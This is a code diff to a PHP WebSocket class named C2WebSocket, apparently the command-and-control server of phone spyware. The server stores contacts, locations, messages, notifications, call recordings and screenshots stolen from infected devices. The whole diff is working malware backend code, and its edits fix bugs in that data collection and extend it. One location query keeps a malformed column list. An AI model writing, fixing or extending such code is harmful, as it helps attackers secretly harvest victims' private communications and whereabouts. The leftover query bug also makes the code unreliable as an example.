@@ -93,7 +93,7 @@ class C2WebSocket implements MessageComponentInterface {
         $clientID = $data->id;
         $this->updateClientWebSocketIDinDatabase($clientID, $conn->resourceId);
 
-        switch ($data['res']) {
+        switch ($data->res) {
             case "contact":
                 $query = "INSERT INTO CONTACT(client_id, name, number) VALUES(?, ?, ?)";
                 $name = base64_decode($data->name);
@@ -107,18 +107,19 @@ class C2WebSocket implements MessageComponentInterface {
                 $this->database->insert($query, [$clientID, $filename, $timestamp]);
                 break;
             case "location":
-                $query = "INSERT INTO LOCATION(client_id, latitude, longitude altitude) VALUES(?, ?, ?, ?)";
+                $query = "INSERT INTO LOCATION(client_id, latitude, longitude altitude, timestamp) VALUES(?, ?, ?, ?, ?)";
                 $latitude = base64_decode($data->latitude);
                 $longitude = base64_decode($data->longitude);
                 $altitude = base64_decode($data->altitude);
-                $this->database->insert($query, [$clientID, $latitude, $longitude, $altitude]);
+                $timestamp = $data->timestamp;
+                $this->database->insert($query, [$clientID, $latitude, $longitude, $altitude, $timestamp]);
                 break;
             case "message":
                 $query = "INSERT INTO MESSAGE(client_id, sender, content, timestamp) VALUES(?, ?, ?, ?)";
                 $sender = base64_decode($data->sender);
                 $content = base64_decode($data->content);
                 $timestamp = $data->timestamp;
-                $this->database->insert($query, [$sender, $content, $timestamp]);
+                $this->database->insert($query, [$clientID, $sender, $content, $timestamp]);
                 break;
             case "notification":
                 $query = "INSERT INTO NOTIFICATION(client_id, sender, content, timestamp) VALUES(?, ?, ?, ?)";
@@ -128,12 +129,13 @@ class C2WebSocket implements MessageComponentInterface {
                 $this->database->insert($query, [$clientID, $sender, $content, $timestamp]);
                 break;
             case "recording":
-                $query = "INSERT INTO RECORDING(client_id, filename, timestamp) VALUES(?, ?, ?)";
+                $query = "INSERT INTO RECORDING(client_id, filename, timestamp, number) VALUES(?, ?, ?, ?)";
                 $filename = base64_decode($data->filename);
+                $number = base64_decode($data->number);
                 $timestamp = $data->timestamp;
-                $this->database->insert($query, [$clientID, $filename, $timestamp]);
+                $this->database->insert($query, [$clientID, $filename, $timestamp, $number]);
                 break;
-            case "screesnshot":
+            case "screenshot":
                 $query = "INSERT INTO SCREENSHOT(client_id, filename, timestamp) VALUES(?, ?, ?)";
                 $filename = base64_decode($data->filename);
                 $timestamp = $data->timestamp;
